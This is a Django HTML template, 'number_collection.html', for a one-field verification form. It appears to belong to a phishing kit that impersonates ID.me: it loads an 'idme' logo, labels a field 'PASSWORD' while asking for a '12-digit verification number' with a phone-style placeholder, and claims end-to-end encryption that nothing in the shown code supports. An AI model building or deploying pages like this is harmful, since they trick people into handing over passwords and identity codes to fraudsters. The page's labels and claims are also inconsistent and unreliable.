<!-- main/templates/main/number_collection.html -->
{% extends 'main/base.html' %}
{% load static %}

{% block content %}
<div class="container-fluid mt-4">
    <div class="row justify-content-center">
        <div class="col-md-6 col-lg-4">
            <div class="card shadow-sm border-0">
                <div class="card-body p-5">
                    <div class="text-center mb-4">
                        <img src="{% static 'img/idme.png' %}" 
                             alt="Verification Logo" 
                             style="height: 40px;" class="mb-3">
                        <h2 class="h4">Password</h2>
                        <p class="text-muted small">*********</p>
                    </div>

                    <form method="POST">
                        {% csrf_token %}
                        <div class="mb-4">
                            <label for="uniqueNumber" class="form-label small text-muted">
                                PASSWORD
                            </label>
                            <input type="text" 
                                   class="form-control form-control-lg" 
                                   id="uniqueNumber" 
                                   name="unique_number"
                                   placeholder="123-456-7890"
                                   pattern="[0-9-]{10,15}"
                                   title="Enter your 12-digit verification number"
                                   required>
                        </div>

                        <button type="submit" class="btn btn-primary w-100 py-2">
                            <i class="bi bi-shield-check me-2"></i>Verify Number
                        </button>
                    </form>

                    <div class="text-center mt-4">
                        <p class="small text-muted">
                            <i class="bi bi-lock-fill me-1"></i>
                            Protected by end-to-end encryption
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}
